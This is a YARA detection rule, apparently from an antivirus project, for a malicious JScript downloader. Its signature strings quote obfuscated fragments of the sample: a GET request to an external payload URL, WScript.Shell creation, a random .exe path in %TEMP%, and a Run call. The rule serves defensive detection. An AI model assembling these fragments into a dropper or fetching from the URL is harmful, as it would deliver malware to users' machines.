rule sig_20160401_6502b667190b8cb3900948283fd9d310 {
  meta:
    description = "datamaliciousorder - file 20160401_6502b667190b8cb3900948283fd9d310.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2fcb9b190720d7fcb7d457cd2dcdab1be3a2457b28b33db59dd2878966d1af1b"

  strings:
    $s1  = "RuaKv[WeWtk](\"G\" + \"ET\", \"http://geetanjalifincorp.com/pqw9aso\", false);" fullword ascii
    $s2  = "function TuYc(LsNr, BwOvu){AajCcc = AajCcc * 1; return LsNr - BwOvu;};" fullword ascii
    $s3  = "var WhfSlm = function WbzToa() {return WScript[JvTaz](\"WScript\"+\".Shell\");}(), VuxEm = 11;" fullword ascii
    $s4  = "if (RuaKv[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function TaHu(){return ZsBui + \"\";};" fullword ascii
    $s6  = "function CqfStv() {return WhfSlm[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"r4FXTb30ukWx.ex\" + \"e\";};" fullword ascii
    $s7  = "function XhrJod() {return ((WzDs == true) && (WzDs == YqnCh)) ? 1 : AajCcc;};" fullword ascii
    $s8  = "var WzDs = false;" fullword ascii
    $s9  = "function SeBgd(){return 23;};" fullword ascii
    $s10 = "function UukRyn(){return JvTaz;};" fullword ascii
    $s11 = "var HblUi = new this[\"Date\"]();" fullword ascii
    $s12 = "YqnCh = true; " fullword ascii
    $s13 = "function KodIn(LnDck) {var GpzOm = (1, 2, 3, 4, 5, LnDck); return GpzOm;};" fullword ascii
    $s14 = "function PhEuv()" fullword ascii
    $s15 = "return TuYc(OlCb, BkYot);" fullword ascii
    $s16 = "}while (OdYac);" fullword ascii
    $s17 = "function XqFdd(AlzVf){WhfSlm[\"R\"+\"un\"](AlzVf, AajCcc, AajCcc);};" fullword ascii
    $s18 = "var YqnCh = false;" fullword ascii
    $s19 = "var MnVx = false;" fullword ascii
    $s20 = "WzDs = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}